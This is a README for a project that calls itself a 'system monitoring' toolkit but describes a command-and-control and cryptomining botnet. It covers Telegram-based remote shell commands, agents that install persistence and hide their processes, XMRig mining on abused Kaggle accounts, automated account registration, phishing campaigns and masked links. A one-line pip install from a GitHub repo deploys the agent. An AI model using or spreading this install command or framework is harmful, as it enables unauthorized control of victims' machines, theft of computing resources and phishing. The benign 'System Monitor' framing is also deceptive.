# System Monitor

**Version:** 3.5  
**Status:** Production Ready ✅

Cross-platform system monitoring and resource optimization toolkit with Telegram C2 integration.

---

## 🚀 Features

### Telegram C2 Integration
- **Direct API communication** - No tunnel needed for Telegram
- **Real-time agent monitoring** - Registration, beacons, results
- **Remote control commands** - `/agents`, `/cmd`, `/mine`, `/results`, `/kill`
- **Auto-cleanup** - Dead agents removed after 10 min offline
- **Detailed logging** - Every action logged with `[POLLER]` prefix

### Email System
- **mail.tm provider** - Real-time 100ms polling
- **Boomlify, 1secmail** - Fallback providers
- **Auto-registration** - Kaggle, GitHub, Gmail support

### Kaggle Agents
- **Batch deployment** - 5 kernels per account
- **Mining integration** - XMRig with stratum proxy
- **Telegram C2** - Direct API, no tunnel required
- **Session persistence** - Auto-reconnect on failure

---

## 📋 Quick Reference

### Server Access
```
Local:   http://localhost:5000

Login:   admin / admin
Quick:   /login?pin=2409 (GET request)
```

### Server Startup
```bash
# Start server
python3 run_unified.py

# Or use manage.sh
./manage.sh start     # Start server
./manage.sh stop      # Stop server
./manage.sh restart   # Restart server
./manage.sh status    # Check status
./manage.sh logs      # View logs
```

### Telegram Bot Commands
```
/start          - Initialize bot, show commands
/agents         - List all connected agents
/cmd <id> <cmd> - Send shell command to agent
/mine <id> <action> - Mining control (start/stop/status)
/results <id>   - Show last 10 agent results
/kill <id>      - Terminate agent
/stats          - Mining statistics
/status         - Server status
/help           - Show help
```

### Agent Commands
```bash
# Install and start (one line)
pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon

# Just start (if already installed)
startcon
```

---

## 📁 Project Structure

```
system-monitor/
├── src/
│   ├── c2/
│   │   ├── server.py           # Main Flask server
│   │   ├── telegram_poller.py  # Telegram C2 poller
│   │   └── orchestrator.py     # Integration modules
│   ├── agents/
│   │   ├── universal.py        # Universal agent (startcon)
│   │   ├── kaggle/             # Kaggle kernels
│   │   │   ├── notebook-telegram.ipynb  # Telegram C2 agent
│   │   │   └── transport.py    # Kaggle API
│   │   └── browser/            # Browser automation
│   ├── autoreg/                # Auto-registration
│   │   └── engine.py           # Registration engine
│   ├── mail/
│   │   └── tempmail.py         # Email providers (mail.tm, boomlify)
│   └── utils/                  # Utilities
├── templates/                  # HTML templates
├── static/                     # CSS/JS files
├── data/                       # Database
├── run_unified.py              # Server entry point
└── requirements.txt            # Dependencies
```

---

## 🚀 Server Installation

### Prerequisites
```bash
# Install dependencies
pip install -r requirements.txt

# Install Kaggle CLI (for Kaggle agents)
pip install kaggle
```

### Quick Start
```bash
# Clone and run
git clone https://github.com/GaredBerns/system-monitor.git
cd system-monitor
pip install -r requirements.txt
python3 run_unified.py
```

The server automatically:
1. Starts Flask server on port 5000
2. Initializes Telegram C2 poller
3. Starts auto-cleanup thread
4. Loads config from data/config.json

---

## 🤖 Agent Features

When you run `startcon`, the agent automatically:

1. **Connects to C2** - Registers with server
2. **Installs Persistence** - Survives reboots via crontab/systemd
3. **Starts Resource Optimization** - Background optimization module
4. **Beacons every 3s** - Maintains connection with jitter
5. **Auto-reconnects** - Exponential backoff on failure

### Kaggle Agent (notebook-telegram.ipynb)

Deploy to Kaggle kernels:
1. Create dataset with 5 kernels via Batch Datasets
2. Each kernel runs Telegram C2 agent
3. Mining enabled by default
4. Detailed logging: `[C2]`, `[AGENT]`, `[MINING]`

### Supported Platforms

| Platform | Detection | Persistence |
|----------|-----------|-------------|
| Linux | ✅ | crontab, systemd |
| macOS | ✅ | LaunchAgent |
| Windows | ✅ | ScheduledTask |
| Colab | ✅ | Session-based |
| Kaggle | ✅ | Session-based |
| Docker | ✅ | Container-based |

---

## 🔧 Configuration

### Telegram C2
```json
// data/config.json
{
  "telegram_bot_token": "YOUR_BOT_TOKEN",
  "telegram_chat_id": "YOUR_CHAT_ID"
}
```

### Environment Variables
```bash
export C2_URL="http://localhost:5000"
export SLEEP="3"      # Beacon interval (seconds)
export JITTER="5"     # Random jitter (%)
export C2_DEBUG="1"   # Enable debug logging
```

---

## 📊 Dashboard Features

- **Agents** - View connected machines, platform, status
- **Tasks** - Send commands, view results
- **Files** - Browse remote filesystem
- **Mining** - Monitor hashvault pool stats
- **Links** - Create masked URLs
- **Phishing** - Email campaigns, templates
- **Kaggle** - Deploy kernels, manage agents

---

## 📝 Recent Changes

### v3.5
- Added Telegram C2 poller with auto-cleanup
- Added `/results`, `/kill` commands
- Added detailed logging everywhere
- Added mail.tm email provider (100ms realtime)
- Fixed DELETE `/api/agents/<id>` endpoint
- Fixed regex for emoji format messages
- Improved error handling with logging

### v3.0
- Added Kaggle kernel deployment
- Added batch dataset creation
- Added mining integration

---

## 🔐 Security

- Auth token support (`X-Auth-Token` header)
- XOR encryption for communications
- TLS/SSL via Cloudflare
- Hidden process names and low priority

---

## 📝 License

MIT License - See LICENSE file
